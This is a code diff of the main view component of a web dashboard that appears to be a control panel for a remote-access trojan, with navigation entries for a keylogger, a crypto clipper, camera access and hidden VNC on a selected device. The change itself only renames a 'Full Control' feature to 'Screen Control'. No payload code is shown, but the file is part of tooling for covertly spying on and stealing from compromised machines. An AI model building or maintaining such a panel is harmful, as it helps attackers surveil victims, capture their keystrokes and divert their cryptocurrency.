@@ -26,8 +26,8 @@ const AppsManager = dynamic(() => import("@/components/features/AppsManager"), {
 const CameraView = dynamic(() => import("@/components/features/CameraView"), {
   loading: () => <div className="p-6">Loading Camera...</div>,
 });
-const FullControl = dynamic(() => import("@/components/features/FullControl"), {
-  loading: () => <div className="p-6">Loading Full Control...</div>,
+const ScreenControl = dynamic(() => import("@/components/features/ScreenControl"), {
+  loading: () => <div className="p-6">Loading Screen Control...</div>,
 });
 const Keylogger = dynamic(() => import("@/components/features/Keylogger"), {
   loading: () => <div className="p-6">Loading Keylogger...</div>,
@@ -54,12 +54,12 @@ const navigationItems = [
   { id: "apps", label: "Apps", icon: Package },
   { id: "keylogger", label: "Keylogger", icon: Keyboard },
   { id: "crypto", label: "Crypto Clipper", icon: Wallet },
-  { id: "control", label: "Full Control", icon: Terminal },
+  { id: "control", label: "Screen Control", icon: Terminal },
   { id: "hidden-vnc", label: "Hidden VNC", icon: EyeOff },
 ];
 
 export default function MainContent({ device, view, onViewSelect, userId }: MainContentProps) {
-  const [triggerFullControl, setTriggerFullControl] = useState(0);
+  const [triggerScreenControl, setTriggerScreenControl] = useState(0);
   const [triggerHiddenVNC, setTriggerHiddenVNC] = useState(0);
   
   if (!device) {
@@ -67,9 +67,9 @@ export default function MainContent({ device, view, onViewSelect, userId }: Main
   }
 
   const handleViewSelect = (selectedView: string) => {
-    // For Full Control and Hidden VNC, don't change view, just trigger popup
+    // For Screen Control and Hidden VNC, don't change view, just trigger popup
     if (selectedView === "control") {
-      setTriggerFullControl(prev => prev + 1);
+      setTriggerScreenControl(prev => prev + 1);
       return; // Don't change the view
     }
     if (selectedView === "hidden-vnc") {
@@ -80,7 +80,7 @@ export default function MainContent({ device, view, onViewSelect, userId }: Main
     onViewSelect(selectedView);
   };
 
-  // Wrapper for FullControl and HiddenVNC that accepts string | null
+  // Wrapper for ScreenControl and HiddenVNC that accepts string | null
   const handleViewSelectWithNull = (selectedView: string | null) => {
     if (selectedView === null) {
       // When null is passed, navigate back to overview (which is null view)
@@ -115,7 +115,7 @@ export default function MainContent({ device, view, onViewSelect, userId }: Main
       case "camera":
         return <CameraView device={device} />;
       case "control":
-        // FullControl content is shown via the always-rendered component above
+        // ScreenControl content is shown via the always-rendered component above
         return null;
       case "hidden-vnc":
         // HiddenVNC content is shown via the always-rendered component above
@@ -127,13 +127,13 @@ export default function MainContent({ device, view, onViewSelect, userId }: Main
 
   return (
     <>
-      {/* Always render FullControl and HiddenVNC ONCE to keep popups persistent and independent */}
+      {/* Always render ScreenControl and HiddenVNC ONCE to keep popups persistent and independent */}
       {/* These instances maintain state independently - popups work regardless of view */}
       {/* Content shows when that view is selected */}
       <div className="flex-1 flex flex-col overflow-hidden bg-background/50">
         {/* Always render both components ONCE - they maintain independent state */}
         {/* Popups work regardless of view, content shows when view matches */}
-        <FullControl device={device} showContent={false} triggerOpen={triggerFullControl} onViewSelect={handleViewSelectWithNull} />
+        <ScreenControl device={device} showContent={false} triggerOpen={triggerScreenControl} onViewSelect={handleViewSelectWithNull} />
         <HiddenVNC device={device} showContent={false} triggerOpen={triggerHiddenVNC} onViewSelect={handleViewSelectWithNull} />
       
         {/* Static Navigation Bar - Always visible when device is selected */}
@@ -141,7 +141,7 @@ export default function MainContent({ device, view, onViewSelect, userId }: Main
           <div className="flex items-center gap-1 p-1">
             {navigationItems.map((item) => {
               const IconComponent = item.icon;
-              // Don't show Full Control or Hidden VNC as active since they don't change view
+              // Don't show Screen Control or Hidden VNC as active since they don't change view
               const isActive = (item.id === "control" || item.id === "hidden-vnc") ? false : view === item.id;
               return (
                 <Button
